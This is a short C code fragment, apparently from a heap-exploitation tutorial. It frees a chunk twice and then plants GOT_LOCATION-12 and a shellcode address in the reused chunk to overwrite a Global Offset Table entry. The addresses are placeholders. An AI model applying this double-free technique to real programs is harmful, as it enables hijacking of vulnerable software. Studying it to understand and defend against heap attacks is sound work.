 first = (void *)malloc(256);
second = (void *)malloc(256);
third = (void *)malloc(256);
fourth = (void *)malloc(256);
free(first);
free(third);
fifth = (void *)malloc(128);
free(first);
sixth = (void *)malloc(256);
*((void **)(sixth+0))=(void *)(GOT\_LOCATION-12);
*((void **)(sixth+4))=(void *)shellcode\_location;
seventh = (void *)malloc(256);
strcpy (fifth, "something”);

